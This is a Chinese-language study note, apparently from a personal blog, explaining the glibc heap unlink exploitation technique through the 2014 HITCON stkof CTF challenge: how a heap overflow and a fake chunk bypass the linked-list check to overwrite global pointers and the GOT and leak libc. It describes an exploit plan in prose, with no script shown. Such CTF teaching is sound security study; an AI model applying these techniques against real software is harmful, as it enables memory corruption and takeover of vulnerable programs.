学习笔记：Unlink

Posted on 2026-03-18 Edited on 2026-03-24 In Notes Views:

Unlink

一、例题

2014 HITCON stkof

本题没有任何提示词输出，主要的输出只有 “FAIL” 和 “OK”。查看反编译，程序有四个功能：

  • 输入 1 ：调用存在 malloc 的函数，输入 size 存储堆指针，打印索引。
  • 输入 2 ：调用存在 read 的函数，输入索引，输入读取字节数，向对应堆块读入信息。
  • 输入 3 ：调用存在 free 的函数，输入索引，释放堆块。
  • 输入 4 ：调用存在 strlen 的函数，输入索引，计算对应堆块内容长度。

很明显 read 选项可以读取任意字节数，存在堆溢出，依然是常规思路泄露 libc 基址。

不过之前做过的堆题都是通过 printf 函数配合控制指针来打印出某 libc 函数地址，这里似乎没有可以直接控制的指针，并且 printf 也没有可以利用的格式化字符串，所以本题需要使用 unlink 中的指针操作来实现泄露。

Unlink 操作

在具体漏洞利用之前，需要了解为什么 unlink 操作可以修改数据。

首先，对于一个已释放的空闲块，它的结构如下：

可以看到，实际上 unlink 的作用就是从双向链表中移除一个块。很明显，这种操作需要通过修改指针来实现的。

重点来看 unlink 的具体操作：

简单解释一下这里的含义：在释放一个块时，P 代表这个块物理上相邻的前一个块或后一个块(如果空闲)；FD 和 BK 是临时变量，分别存储 P 的 fd 和 bk 指针。注意这里的关键检查，之后有用。

一个正常的双向链表如下图：

可以看到，双向链表是以在.data段的main_arena结构体为链表头，通过 fd 和 bk 连接起来的环状结构。

这里的三个蓝色块代表已释放的空闲块，虚线部分代表正在使用的块，其中 IN_USE 块和 chunk1 物理内存上相邻。于是，当释放 IN_USE 块时，检查发现前一个块空闲，需要合并，触发 unlink，此时 chunk1 即为 P。

unlink 过程中，P->fd，即P的 fd 指针的值，赋值给FD，因为 fd 指向 chunk2 头部，fd 实际上就是 chunk2 的地址，所以 FD 可以理解为代表 chunk2；同理，BK 可以理解为代表 main_arena。（这里重点要理解 P->fd 在底层做了什么，因为 fd 在一个堆块偏移0x10的位置，这里要取得 fd 的值，所以 FD = P->fd 实际上执行的是 FD = [P_addr + 0x10]。）

根据上述内容，之后的写入操作就很容易理解了：

  • FD->bk = BK：把 main_arena 的地址写入 chunk2 的 bk 指针
  • BK->fd = FD：把 chunk2 的地址写入 main_arena 的 fd 指针

unlink 操作完成后如下图：

可以看到，unlink 结束，P 块已经从双向链表中剔除，其余三个形成了完整的环状结构。之后的合并块以及添加块不再赘述，此处 unlink 漏洞的核心在于两个写入操作：

  • FD->bk = BK
  • BK->fd = FD

之前讲到 P->fd 的实际含义，下面把它总结出来：

  • FD=P->fd：FD = [P_addr + 0x10]
  • BK=P->bk：BK = [P_addr + 0x18]

这样就很清晰了，只要我们可以控制 P 的 fd 和 bk，我们就可以获得任意地址写的能力。

以FD->bk = BK为例，就是把 P 的 bk 指针的值，写入到 fd 指针指向地址的 0x18 偏移处，也就是说，我们需要控制 fd 等于 target_addr - 0x18，bk 等于 target_content 即可。另有一点需要注意，在FD->bk = BK之后，unlink还要执行BK=P->bk，在本题利用中会发生覆写，存在误差。

首先申请3个0x30字节的堆块调试一下：

可以看到，在我们申请的0x30堆块之前和之后都有一个0x410的堆块，它们是什么对于这里的 unlink 攻击没有关系，这里之后再讲，重点需要知道这里用户申请的第一和第二个堆块之间有一个0x410的块间隔。

有了这些信息，我们可以形成一个大致的泄露思路：

申请3个堆块，chunk1、chunk2、chunk3，返回的指针分别存储在 global[1]、global[2]、global[3]；chunk2、3物理连续，我们直接在 chunk2 里伪造一个空闲块，控制 fd 和 bk，并 free chunk3，通过 unlink 修改某个 global 指针，使其等于 global 起始地址，于是可以通过 read 操作修改所有 global 指针，使其存在 puts@got 和 free@got，之后通过 read 将 got 表的 free 项改成 puts@plt，最后通过 free(puts@got) 实际执行 puts(puts@got) 泄露地址

本人刚开始有一个疑问，为什么要在chunk2内部伪造一个块结构，而不是直接利用chunk2已有的元数据直接伪造 fd 和 bk？本人尝试了一下，发现无论如何构造 chunk2，在 free 时总会出现”corrupted double-linked list:”这种错误。

要解释这个问题需要回到之前的 unlink 宏的代码，里面有一个关键检查：

可以看到，在执行真正的写入操作之前，会先检查双向链表完整性，要求 FD->bk == P ，BK->fd == P，由于我们需要伪造的 fd 和 bk 是指向 global 区域，然而 global 区域存储的是堆块指针，如果直接修改 chunk2，无论如何都无法满足这里的检查。

而在chunk2内部伪造块结构则及其巧妙的解决了这个问题，在这个方法中，我们 free(chunk3)实际上被 unlink 的堆块是伪造的 fake_chunk，也就是前面说的 P，它刚好位于 chunk2 + 0x10的位置，而 FD->bk 实际上是 fd + 0x18，也就是 (p_array + 16 - 0x18) + 0x18 == p_array +16，这个位置存储着 chunk2 的用户区指针，即 chunk2 + 0x10，刚好等于 fake_chunk 的起始地址，同理，BK->fd 也等于 fake_chunk 的起始地址，这样构造恰好满足 unlink 检查，这是一个很巧妙的方法。
